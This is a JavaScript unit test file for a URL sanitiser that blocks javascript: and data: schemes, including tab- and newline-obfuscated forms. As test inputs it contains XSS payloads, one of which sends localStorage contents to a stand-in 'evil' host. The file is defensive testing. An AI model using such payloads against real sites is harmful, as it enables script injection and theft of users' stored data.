import { describe, it, expect } from 'vitest';
import { safeExternalUrl } from '../../src/lib/safe-url.js';

describe('safeExternalUrl', () => {
  it('rejects javascript: protocol', () => {
    // Mutation-kill anchor: revert the http/https protocol check and this
    // returns the raw javascript: URL instead of '', going RED.
    expect(safeExternalUrl("javascript:alert(1)")).toBe('');
    expect(safeExternalUrl("javascript:fetch('//evil?'+localStorage.x)")).toBe('');
  });

  it('rejects data:text/html protocol', () => {
    expect(safeExternalUrl('data:text/html,<script>alert(1)</script>')).toBe('');
  });

  it('rejects obfuscated javascript: with embedded tab/newline', () => {
    // The WHATWG URL parser strips ASCII tab/newline before resolving the
    // scheme, so these normalize to javascript: and must still be rejected.
    expect(safeExternalUrl('java\tscript:alert(1)')).toBe('');
    expect(safeExternalUrl('java\nscript:alert(1)')).toBe('');
  });

  it('permits https URLs and returns them normalized', () => {
    expect(safeExternalUrl('https://arxiv.org/abs/2401.00001')).toBe('https://arxiv.org/abs/2401.00001');
  });

  it('permits http URLs', () => {
    expect(safeExternalUrl('http://example.com/paper.pdf')).toBe('http://example.com/paper.pdf');
  });

  it('returns "" for non-string, empty, and unparseable input', () => {
    expect(safeExternalUrl(null)).toBe('');
    expect(safeExternalUrl(undefined)).toBe('');
    expect(safeExternalUrl('')).toBe('');
    expect(safeExternalUrl(42)).toBe('');
  });
});
